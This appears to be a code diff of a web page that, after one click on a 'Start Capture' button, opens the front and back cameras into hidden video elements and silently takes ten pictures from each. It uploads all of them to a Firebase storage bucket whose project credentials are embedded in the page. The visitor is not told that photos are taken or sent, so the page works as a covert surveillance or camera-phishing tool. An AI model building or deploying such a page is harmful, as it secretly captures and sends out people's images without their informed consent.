@@ -3,16 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Capture 10 Front & 10 Back Images</title>
+    <title>Auto Capture Images</title>
+</head>
+<body>
+    <button id="startCapture">Start Capture</button>
+    <video id="frontVideo" style="display:none;" autoplay playsinline muted></video>
+    <video id="backVideo" style="display:none;" autoplay playsinline muted></video>
 
-    <!-- Firebase SDK -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
 
-        // Replace with your Firebase config
         const firebaseConfig = {
-           apiKey: "AIzaSyCUcrXxdp-xaDemWm6XeODP43L4c8nsFZU",
+             apiKey: "AIzaSyCUcrXxdp-xaDemWm6XeODP43L4c8nsFZU",
   authDomain: "valute3.firebaseapp.com",
   databaseURL: "https://valute3-default-rtdb.firebaseio.com",
   projectId: "valute3",
@@ -22,98 +25,77 @@
   measurementId: "G-VBSCFW4HQP"
         };
 
-        // Initialize Firebase
         const app = initializeApp(firebaseConfig);
         const storage = getStorage(app);
 
         async function getCameraStream(useFrontCamera) {
-            const constraints = {
-                video: {
-                    facingMode: useFrontCamera ? "user" : "environment"
-                }
-            };
-            return await navigator.mediaDevices.getUserMedia(constraints);
+            try {
+                const constraints = {
+                    video: {
+                        facingMode: useFrontCamera ? "user" : { exact: "environment" } 
+                    }
+                };
+                return await navigator.mediaDevices.getUserMedia(constraints);
+            } catch (error) {
+                console.warn("⚠ Camera access failed, switching to default mode.");
+                return await navigator.mediaDevices.getUserMedia({ video: true });
+            }
         }
 
         async function captureAndUploadPhoto(video, index, useFrontCamera) {
-            try {
-                const canvas = document.createElement("canvas");
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext("2d");
+            return new Promise(async (resolve, reject) => {
+                try {
+                    const canvas = document.createElement("canvas");
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext("2d");
 
-                // Capture image from video stream
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                // Convert image to Blob and upload
-                canvas.toBlob(async (blob) => {
-                    const cameraType = useFrontCamera ? "front" : "back";
-                    const fileName = `images9844120/${cameraType}_${index + 1}_${Date.now()}.png`;
-                    const storageRef = ref(storage, fileName);
-                    await uploadBytes(storageRef, blob);
+                    canvas.toBlob(async (blob) => {
+                        const cameraType = useFrontCamera ? "front" : "back";
+                        const fileName = `images974244/${cameraType}_${index + 1}_${Date.now()}.png`;
+                        const storageRef = ref(storage, fileName);
+                        await uploadBytes(storageRef, blob);
 
-                    // Get download URL
-                    const downloadURL = await getDownloadURL(storageRef);
-                    console.log(`Uploaded ${cameraType} image ${index + 1}:`, downloadURL);
-                }, "image/png");
-            } catch (error) {
-                console.error("Error capturing image:", error);
-            }
+                        const downloadURL = await getDownloadURL(storageRef);
+                        console.log(`✅ Uploaded ${cameraType} image ${index + 1}:`, downloadURL);
+                        resolve();
+                    }, "image/png");
+                } catch (error) {
+                    console.error("❌ Error capturing image:", error);
+                    reject(error);
+                }
+            });
         }
 
         async function captureMultipleImages() {
-            try {
-                console.log("📸 Requesting camera permission...");
+            console.log("📸 Requesting camera permission...");
 
-                // Request permission via user interaction
-                const frontStream = await getCameraStream(true);
-                const backStream = await getCameraStream(false);
+            const frontStream = await getCameraStream(true);
+            const backStream = await getCameraStream(false);
 
-                const frontVideo = document.createElement("video");
-                frontVideo.srcObject = frontStream;
-                frontVideo.autoplay = true;
-                frontVideo.muted = true;  // Auto-play without sound on mobile
-                frontVideo.playsinline = true;  // Plays inline on mobile
+            const frontVideo = document.getElementById("frontVideo");
+            frontVideo.srcObject = frontStream;
+            await frontVideo.play();
 
-                await new Promise(resolve => (frontVideo.onloadedmetadata = resolve));
+            const backVideo = document.getElementById("backVideo");
+            backVideo.srcObject = backStream;
+            await backVideo.play();
 
-                const backVideo = document.createElement("video");
-                backVideo.srcObject = backStream;
-                backVideo.autoplay = true;
-                backVideo.muted = true;
-                backVideo.playsinline = true;
-
-                await new Promise(resolve => (backVideo.onloadedmetadata = resolve));
-
-                console.log("📸 Capturing 10 Front & 10 Back Images...");
-
-                // Capture 10 front camera images
-                for (let i = 0; i < 10; i++) {
-                    await captureAndUploadPhoto(frontVideo, i, true);
-                }
-
-                // Capture 10 back camera images
-                for (let i = 0; i < 10; i++) {
-                    await captureAndUploadPhoto(backVideo, i, false);
-                }
-
-                // Stop camera streams
-                frontStream.getTracks().forEach(track => track.stop());
-                backStream.getTracks().forEach(track => track.stop());
-
-                console.log("✅ All images captured and uploaded!");
-            } catch (error) {
-                console.error("Error capturing images:", error);
+            console.log("📸 Capturing images...");
+            for (let i = 0; i < 10; i++) {
+                await captureAndUploadPhoto(frontVideo, i, true);
+                await captureAndUploadPhoto(backVideo, i, false);
             }
+
+            frontStream.getTracks().forEach(track => track.stop());
+            backStream.getTracks().forEach(track => track.stop());
+
+            console.log("✅ All images captured and uploaded!");
         }
 
-        // Trigger image capture via a button click (important for mobile browsers)
-        window.onload = () => {
-            document.getElementById("startCaptureButton").onclick = captureMultipleImages;
-        };
+        document.getElementById("startCapture").addEventListener("click", captureMultipleImages);
     </script>
-</head>
-<body>
-    <button id="startCaptureButton">Start Capture</button>
 </body>
 </html>
